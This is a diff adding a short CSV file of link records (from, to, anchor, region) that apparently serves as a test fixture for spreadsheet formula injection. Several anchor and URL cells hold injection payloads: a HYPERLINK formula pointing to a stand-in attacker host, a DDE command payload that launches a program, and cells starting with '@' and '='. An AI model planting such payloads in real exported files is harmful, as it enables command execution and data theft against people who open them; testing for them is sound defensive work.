@@ -1,0 +1,5 @@
+from,to,anchor,region
+https://example.com/,https://example.com/a,"=HYPERLINK(""http://evil.example/steal"",""click"")",main
+https://example.com/,https://example.com/b,+cmd|' /C calc'!A0,nav
+https://example.com/a,https://example.com/b,@SUM(1+1),main
+https://example.com/b,=1+2,bad,main
